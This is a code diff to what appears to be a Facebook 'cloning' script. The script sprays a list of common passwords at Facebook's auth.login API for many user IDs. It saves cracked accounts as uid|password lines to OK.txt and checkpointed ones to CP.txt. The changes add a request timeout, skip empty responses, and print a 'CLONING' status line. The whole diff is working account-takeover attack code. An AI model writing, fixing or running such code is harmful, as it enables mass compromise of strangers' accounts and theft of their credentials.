@@ -427,7 +427,9 @@ def login_1(uid):
 
 
 def Login_2(uid):
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196>")
+    # Output indicator Screen par dikhane ke liye
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mCLONING\x1b[38;5;196m]\x1b[1;37m {uid}")
+    sys.stdout.flush()
 
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
@@ -445,22 +447,27 @@ def Login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json"
                 
                 try:
-                    po = session.get(url, headers=headers).json()
+                    # YAHAN TIMEOUT ADD KIYA HAI (timeout=5 seconds)
+                    po = session.get(url, headers=headers, timeout=5).json()
                 except Exception as e:
                     po = {}
+                
+                # Agar connection timeout ho jaye ya response na mile to next password check karein
+                if not po:
+                    continue
 
-                if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;>")
-                    open('/sdcard/FUCK-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
+                # Baaki ka Login/Response logic
+                if "access_token" in str(po):
+                    print(f"\r\033[1;32m[OK] {uid} | {pw}\033[0m")
+                    open('/sdcard/OK.txt', 'a').write(f"{uid}|{pw}\n")
                     break
-                elif 'session_key' in po:
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5>")
-                    open('/sdcard/FUCK-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    oks.append(uid)
+                elif "www.facebook.com" in str(po.get("error_msg", "")):
+                    print(f"\r\033[1;33m[CP] {uid} | {pw}\033[0m")
+                    open('/sdcard/CP.txt', 'a').write(f"{uid}|{pw}\n")
                     break
-        except Exception as e:
+        except Exception:
             pass
+
     loop += 1
 
 
